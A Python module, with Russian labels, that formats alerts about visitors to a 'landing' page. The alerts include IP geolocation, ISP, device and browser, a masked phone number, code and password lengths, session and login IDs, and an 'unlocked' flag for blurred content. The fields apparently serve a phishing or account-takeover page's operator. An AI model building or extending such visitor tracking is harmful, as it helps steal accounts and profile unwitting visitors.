from __future__ import annotations

from datetime import datetime, timezone
from typing import Any, Mapping

from landing.event_labels import ACTION_TITLES, DETAIL_LABELS, HEADER_KEYS


def mask_phone(phone: str) -> str:
	digits = "".join(ch for ch in (phone or "") if ch.isdigit() or ch == "+")
	if len(digits) <= 4:
		return "***"
	return f"{digits[:3]}***{digits[-2:]}"


def now_local() -> str:
	return datetime.now(timezone.utc).astimezone().strftime("%Y-%m-%d %H:%M:%S")


def short(value: Any, limit: int = 180) -> str:
	text = str(value).replace("\n", " ").strip()
	if len(text) > limit:
		return text[: limit - 3] + "..."
	return text


def fmt_value(key: str, value: Any) -> str:
	if key in {"blur", "proxy", "cookie"}:
		if value in {True, "yes", "true", "1", 1}:
			return "да"
		if value in {False, "no", "false", "0", 0}:
			return "нет"
	if isinstance(value, bool):
		return "да" if value else "нет"
	return short(value)


def build_event_text(
	action: str,
	*,
	client: Mapping[str, Any],
	unlocked: bool | None,
	details: Mapping[str, Any],
) -> str:
	raw = dict(details)
	for key in list(raw.keys()):
		if key in HEADER_KEYS:
			raw.pop(key, None)

	title = ACTION_TITLES.get(action, action)
	ip_kind = client.get("ip_kind") or "-"
	browser_tz = client.get("browser_tz") or "-"
	lines = [
		f"🛰 ЛЕНДИНГ · {title}",
		f"⏱ {now_local()}",
		f"🌐 IP: {client['ip']}",
		f"📍 Страна (по IP): {client['country']}",
		f"🏙 Город: {client['city']}",
		f"🗺 Регион: {client['region']}",
		f"📡 Провайдер: {client['isp']}",
		f"🏢 Организация: {client['org']}",
		f"🔎 Тип IP: {ip_kind}",
		f"🕒 TZ по IP: {client['timezone']}",
	]
	if browser_tz and browser_tz != "-":
		lines.append(f"🕒 TZ браузера: {browser_tz}")
	if ip_kind not in {"-", "обычный", "локальный"}:
		lines.append("⚠️ Гео по IP — выход VPN/прокси/ДЦ, не место пользователя")
	lines.extend(
		[
			f"💻 Устройство: {client['device']}",
			f"🖥 ОС: {client['os']}",
			f"🌍 Браузер: {client['browser']}",
			f"🗣 Язык: {client['lang']}",
		]
	)
	if unlocked is not None:
		lines.append(f"🔓 Разблокирован: {'да' if unlocked else 'нет'}")
	if client.get("ref") and client["ref"] != "-":
		lines.append(f"↩ Referer: {short(client['ref'])}")

	extra_order = [
		"place",
		"path",
		"query",
		"nick",
		"blur",
		"cookie",
		"step",
		"stage",
		"phone",
		"code_len",
		"password_len",
		"login_id",
		"user",
		"job_id",
		"session",
		"proxy",
		"error",
		"url",
		"tag",
	]
	seen = set()
	for key in extra_order:
		if key not in raw:
			continue
		seen.add(key)
		lines.append(f"{DETAIL_LABELS.get(key, key)}: {fmt_value(key, raw[key])}")
	for key, value in raw.items():
		if key in seen or value is None or value == "":
			continue
		lines.append(f"{DETAIL_LABELS.get(key, key)}: {fmt_value(key, value)}")

	lines.append(f"User-Agent: {short(client['ua'], 220)}")
	return "\n".join(lines)
